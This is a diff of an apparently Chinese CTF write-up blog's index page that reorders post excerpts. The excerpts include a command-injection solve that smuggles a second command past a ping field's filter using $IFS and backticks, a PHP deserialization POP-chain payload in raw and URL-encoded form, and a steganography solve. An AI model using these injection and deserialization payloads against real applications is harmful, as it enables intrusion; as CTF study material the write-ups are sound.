@@ -181,58 +181,6 @@
         
 
 <div class="post">
-    <a href="/2026/02/02/2026-02-02-Ping-Ping-Ping/">
-        <h2 class="post-title">Ping Ping Ping</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2026/2/2
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <p>这里提示可以执行命令，尝试输入127.0.0.1;ls,发现flag.php和index.php,直接cat flag.php</p>
-<p>发现空格被禁止了flag也被禁止了，127.0.0.1;cat$IFS$9<code>ls</code>这里先执行ls再执行cat发现index.php的内容显示在下面了应该是执行成功，没看到flag打开源码查看发现flag</p>
-<p><img src="/images/writeups/Ping-Ping-Ping_b1712aa5.png" alt="Ping-Ping-Ping_b1712aa5"></p>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <i class="fa-solid fa-tags fa-fw"></i>
-        </span>
-        
-        
-        
-        <span class="tag">
-            
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #00a596">题解</a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/RCE/" style="color: #00bcd4">RCE</a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/" style="color: #ffa2c4">命令注入</a>
-        </span>
-        
-    </div>
-    <a href="/2026/02/02/2026-02-02-Ping-Ping-Ping/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
     <a href="/2026/02/02/2026-02-02-Interesting_include/">
         <h2 class="post-title">Interesting_include</h2>
     </a>
@@ -271,62 +219,11 @@
         
         <span class="tag">
             
-            <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="color: #ffa2c4">文件包含</a>
+            <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="color: #00a596">文件包含</a>
         </span>
         
     </div>
     <a href="/2026/02/02/2026-02-02-Interesting_include/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2026/02/02/2026-02-02-pop/">
-        <h2 class="post-title">pop</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2026/2/2
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <p><code>分析代码这里得到flag的流程应该是反序列化 -&gt; w22m对象 -&gt;__destruct() -&gt;echo $this-&gt;w00m(w33m对象) -&gt;_toString() -&gt;$this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;() -&gt;w44m-&gt;Getflag()</code></p>
-<p><code>然后payload：</code></p>
-<p><code>O:4:&quot;w22m&quot;:1:&#123;s:4:&quot;w00m&quot;;O:4:&quot;w33m&quot;:2:&#123;s:4:&quot;w00m&quot;;O:4:&quot;w44m&quot;:2:&#123;s:11:&quot;\0w44m\0admin&quot;;s:4:&quot;w44m&quot;;s:9:&quot;\0*\0passwd&quot;;s:5:&quot;08067&quot;;&#125;s:4:&quot;w22m&quot;;s:7:&quot;Getflag&quot;;&#125;&#125;</code></p>
-<p><code>然后url编码得到</code></p>
-<p><code>O%3A4%3A%22w22m%22%3A1%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w33m%22%3A2%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w44m%22%3A2%3A%7Bs%3A11%3A%22%00w44m%00admin%22%3Bs%3A4%3A%22w44m%22%3Bs%3A9%3A%22%00%2A%00passwd%22%3Bs%3A5%3A%2208067%22%3B%7Ds%3A4%3A%22w22m%22%3Bs%3A7%3A%22Getflag%22%3B%7D%7D</code></p>
-<p><code>最后得到flag</code></p>
-<p>&#96;&#96;</p>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <i class="fa-solid fa-tags fa-fw"></i>
-        </span>
-        
-        
-        
-        <span class="tag">
-            
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #00a596">题解</a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="color: #03a9f4">反序列化</a>
-        </span>
-        
-    </div>
-    <a href="/2026/02/02/2026-02-02-pop/" class="go-post">阅读全文</a>
 </div>
 
 <div class="post">
@@ -368,11 +265,63 @@
         
         <span class="tag">
             
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #00a596">题解</a>
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #ff7d73">题解</a>
         </span>
         
     </div>
     <a href="/2026/02/02/2026-02-02-come-on/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2026/02/02/2026-02-02-Ping-Ping-Ping/">
+        <h2 class="post-title">Ping Ping Ping</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2026/2/2
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>这里提示可以执行命令，尝试输入127.0.0.1;ls,发现flag.php和index.php,直接cat flag.php</p>
+<p>发现空格被禁止了flag也被禁止了，127.0.0.1;cat$IFS$9<code>ls</code>这里先执行ls再执行cat发现index.php的内容显示在下面了应该是执行成功，没看到flag打开源码查看发现flag</p>
+<p><img src="/images/writeups/Ping-Ping-Ping_b1712aa5.png" alt="Ping-Ping-Ping_b1712aa5"></p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #ff7d73">题解</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/RCE/" style="color: #00a596">RCE</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/" style="color: #03a9f4">命令注入</a>
+        </span>
+        
+    </div>
+    <a href="/2026/02/02/2026-02-02-Ping-Ping-Ping/" class="go-post">阅读全文</a>
 </div>
 
 <div class="post">
@@ -458,8 +407,8 @@
 </div>
 
 <div class="post">
-    <a href="/2026/02/02/2026-02-02-%E5%A5%BD%E7%9C%8B%E7%9A%84%E7%85%A7%E7%89%87/">
-        <h2 class="post-title">好看的照片</h2>
+    <a href="/2026/02/02/2026-02-02-pop/">
+        <h2 class="post-title">pop</h2>
     </a>
     <div class="category-and-date">
         
@@ -475,8 +424,13 @@
     <div class="description">
         <div class="content" v-pre>
             
-            <p><img src="/images/writeups/%E5%A5%BD%E7%9C%8B%E7%9A%84%E7%85%A7%E7%89%87_9382f448.png" alt="好看的照片_9382f448"><br>发现文件有隐藏文件binwalk分解一下发现一个加密的压缩包和一个解密成功解出密码为7Fx.,压缩包里面是分成9份的二维码重新拼上识别得到flag</p>
-<p>flag{Congratulations on getting this question right}</p>
+            <p><code>分析代码这里得到flag的流程应该是反序列化 -&gt; w22m对象 -&gt;__destruct() -&gt;echo $this-&gt;w00m(w33m对象) -&gt;_toString() -&gt;$this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;() -&gt;w44m-&gt;Getflag()</code></p>
+<p><code>然后payload：</code></p>
+<p><code>O:4:&quot;w22m&quot;:1:&#123;s:4:&quot;w00m&quot;;O:4:&quot;w33m&quot;:2:&#123;s:4:&quot;w00m&quot;;O:4:&quot;w44m&quot;:2:&#123;s:11:&quot;\0w44m\0admin&quot;;s:4:&quot;w44m&quot;;s:9:&quot;\0*\0passwd&quot;;s:5:&quot;08067&quot;;&#125;s:4:&quot;w22m&quot;;s:7:&quot;Getflag&quot;;&#125;&#125;</code></p>
+<p><code>然后url编码得到</code></p>
+<p><code>O%3A4%3A%22w22m%22%3A1%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w33m%22%3A2%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w44m%22%3A2%3A%7Bs%3A11%3A%22%00w44m%00admin%22%3Bs%3A4%3A%22w44m%22%3Bs%3A9%3A%22%00%2A%00passwd%22%3Bs%3A5%3A%2208067%22%3B%7Ds%3A4%3A%22w22m%22%3Bs%3A7%3A%22Getflag%22%3B%7D%7D</code></p>
+<p><code>最后得到flag</code></p>
+<p>&#96;&#96;</p>
 
             
         </div>
@@ -491,16 +445,16 @@
         
         <span class="tag">
             
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #ffa2c4">题解</a>
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #03a9f4">题解</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/" style="color: #00bcd4">图片隐写</a>
+            <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="color: #ff7d73">反序列化</a>
         </span>
         
     </div>
-    <a href="/2026/02/02/2026-02-02-%E5%A5%BD%E7%9C%8B%E7%9A%84%E7%85%A7%E7%89%87/" class="go-post">阅读全文</a>
+    <a href="/2026/02/02/2026-02-02-pop/" class="go-post">阅读全文</a>
 </div>
 
 <div class="post">
@@ -548,11 +502,57 @@
         
         <span class="tag">
             
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #00a596">题解</a>
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #ff7d73">题解</a>
         </span>
         
     </div>
     <a href="/2026/02/02/2026-02-02-%E6%96%B0%E5%B9%B4%E5%BF%AB%E4%B9%90/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2026/02/02/2026-02-02-%E5%A5%BD%E7%9C%8B%E7%9A%84%E7%85%A7%E7%89%87/">
+        <h2 class="post-title">好看的照片</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2026/2/2
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p><img src="/images/writeups/%E5%A5%BD%E7%9C%8B%E7%9A%84%E7%85%A7%E7%89%87_9382f448.png" alt="好看的照片_9382f448"><br>发现文件有隐藏文件binwalk分解一下发现一个加密的压缩包和一个解密成功解出密码为7Fx.,压缩包里面是分成9份的二维码重新拼上识别得到flag</p>
+<p>flag{Congratulations on getting this question right}</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #ff7d73">题解</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/" style="color: #00bcd4">图片隐写</a>
+        </span>
+        
+    </div>
+    <a href="/2026/02/02/2026-02-02-%E5%A5%BD%E7%9C%8B%E7%9A%84%E7%85%A7%E7%89%87/" class="go-post">阅读全文</a>
 </div>
 
 <div class="post">
@@ -591,12 +591,12 @@
         
         <span class="tag">
             
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #ff7d73">题解</a>
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #00a596">题解</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="color: #00a596">文件包含</a>
+            <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="color: #03a9f4">文件包含</a>
         </span>
         
     </div>
